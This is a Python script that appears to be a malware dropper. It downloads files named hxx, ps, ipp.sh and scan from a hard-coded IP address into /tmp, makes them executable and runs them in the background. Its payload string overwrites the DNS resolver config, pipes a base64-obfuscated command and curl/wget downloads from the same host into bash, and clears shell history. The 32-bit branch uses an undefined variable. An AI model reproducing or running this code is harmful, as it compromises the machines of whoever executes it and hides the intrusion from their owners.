import urllib
import platform
import os

payload = 'echo "nameserver 8.8.8.8" > /etc/resolv.conf; echo "cHl0aG9uIC1jICdpbXBvcnQgdXJsbGliO2V4ZWModXJsbGliLnVybG9wZW4oImh0dHA6Ly8yMDUuMTg1LjExMy4xNTEvZC5weSIpLnJlYWQoKSkn" | base64 -d | bash -; wget -q -O - http://205.185.113.151/xmi | bash -sh; curl -fsSL http://205.185.113.151/xmi | bash -sh; lwp-download http://205.185.113.151/xmi /tmp/xmi; bash /tmp/xmi; rm -rf /tmp/xmi; history -c'
if platform.architecture()[0] == "64bit":
	urlx64 = "http://205.185.113.151/hxx"
	urlxx = "http://205.185.113.151/ps"
	urlxxx = "http://205.185.113.151/ipp.sh"
	urlxxxx = "http://205.185.113.151/scan"
	try:
		f = urllib.urlopen(urlx64)
		if f.code == 200:
			data = f.read()
			with open ("/tmp/hxx", "wb") as code:
				code.write(data)
		xx = urllib.urlopen(urlxx)
		if xx.code == 200:
			data = xx.read()
			with open ("/tmp/ps", "wb") as code:
				code.write(data)
		xxx = urllib.urlopen(urlxxx)
		if xxx.code == 200:
			data = xxx.read()
			with open ("/tmp/ipp.sh", "wb") as code:
				code.write(data)
		xxxx = urllib.urlopen(urlxxxx)
		if xxxx.code == 200:
			data = xxxx.read()
			with open ("/tmp/scan", "wb") as code:
				code.write(data)
		os.chmod("/tmp/hxx", 0o777)
		os.chmod("/tmp/scan", 0o777)
		os.chmod("/tmp/ps", 0o777)
		os.system("nohup bash /tmp/ipp.sh >/dev/null 2>&1")

	except:
		pass
else:
	urlx32 = "http://205.185.113.151/hxx"
	urlyy = "http://205.185.113.151/ps"
	urlyyy = "http://205.185.113.151/ipp.sh"
	urlyyyy = "http://205.185.113.151/scan"
	try:
		f = urllib.urlopen(urlx64)
		if f.code == 200:
			data = f.read()
			with open ("/tmp/hxx", "wb") as code:
				code.write(data)
		yy = urllib.urlopen(urlyy)
		if yy.code == 200:
			data = yy.read()
			with open ("/tmp/ps", "wb") as code:
				code.write(data)
		yyy = urllib.urlopen(urlyyy)
		if yyy.code == 200:
			data = yyy.read()
			with open ("/tmp/ipp.sh", "wb") as code:
				code.write(data)
		yyyy = urllib.urlopen(urlyyyy)
		if yyyy.code == 200:
			data = yyyy.read()
			with open ("/tmp/scan", "wb") as code:
				code.write(data)
		os.chmod("/tmp/hxx", 0o777)
		os.chmod("/tmp/ps", 0o777)
		os.chmod("/tmp/scan", 0o777)
		os.system("nohup bash /tmp/ipp.sh >/dev/null 2>&1")

	except:
		pass
